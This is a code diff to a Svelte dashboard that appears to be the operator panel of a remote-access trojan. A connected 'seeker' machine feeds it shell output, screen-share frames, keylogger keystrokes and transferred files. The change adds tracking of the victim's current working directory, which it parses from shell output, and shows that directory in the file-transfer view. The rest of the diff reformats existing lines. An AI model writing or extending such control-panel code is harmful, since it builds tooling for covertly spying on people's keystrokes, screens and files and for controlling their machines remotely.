@@ -17,6 +17,7 @@
 	const shellOutput = writable<string[]>([]);
 	const screenShareFrame = writable<string>('');
 	const fileTransferOutput = writable<string[]>([]);
+    const currentCwd = writable<string>('No current working directory');
 
 	function decodeHtml(html: string): string {
 		const txt = document.createElement('textarea');
@@ -50,6 +51,12 @@
 		}
 		if (current) result.push(current);
 		return result;
+	}
+
+	function extractPath(message: string) {
+		const pathRegex = /^[A-Z]:\\(?:[^\\:*?"<>|\r\n]+\\)*[^\\:*?"<>|\r\n]*/i;
+		const match = message.match(pathRegex);
+		return match ? match[0] : null;
 	}
 
 	$: if (seeker?.keylogs) {
@@ -99,6 +106,7 @@
 							console.log('Seeker disconnected.');
 							connected.set(false);
 							fileTransferOutput.set([]);
+                            currentCwd.set('No current working directory');
 						}
 						break;
 					case 'keylogger_keys':
@@ -113,7 +121,12 @@
 						break;
 					case 'shell_output':
 						shellOutput.update((arr) => [...arr, message.data as string]);
-						break;
+						const path = extractPath(message.data);
+						if (path) {
+							currentCwd.set(path);
+							fileTransferOutput.update((arr) => [...arr, `[Info] Current working directory: ${path}`]);
+						}
+                        break;
 					case 'screenshare_frame':
 						screenShareFrame.set(message.data as string);
 						break;
@@ -131,12 +144,18 @@
 								link.href = `data:application/octet-stream;base64,${file_data.content}`;
 								link.download = file_data.filename;
 								link.click();
-								fileTransferOutput.update((arr) => [...arr, `[Success] Downloaded ${file_data.filename}`]);
+								fileTransferOutput.update((arr) => [
+									...arr,
+									`[Success] Downloaded ${file_data.filename}`
+								]);
 							} else {
 								fileTransferOutput.update((arr) => [...arr, `[Error] Invalid file data received`]);
 							}
 						} catch (e) {
-							fileTransferOutput.update((arr) => [...arr, `[Error] Failed to process download: ${e}`]);
+							fileTransferOutput.update((arr) => [
+								...arr,
+								`[Error] Failed to process download: ${e}`
+							]);
 						}
 						break;
 					default:
@@ -169,11 +188,11 @@
 
 {#if seeker}
 	<div class="p-6 bg-gray-800 rounded shadow-lg space-y-6">
-		<InfoComponent {seeker} {connected}/>
+		<InfoComponent {seeker} {connected} />
 		<ShellComponent {sendMessage} {shellOutput} />
 		<ScreenShareComponent {sendMessage} {screenShareFrame} />
 		<KeyloggerComponent {sendMessage} {keylogs} />
-		<FileTransferComponent {sendMessage} {fileTransferOutput} />
+		<FileTransferComponent {sendMessage} {fileTransferOutput} {currentCwd} />
 		<MessageComponent {sendMessage} />
 	</div>
 {:else}
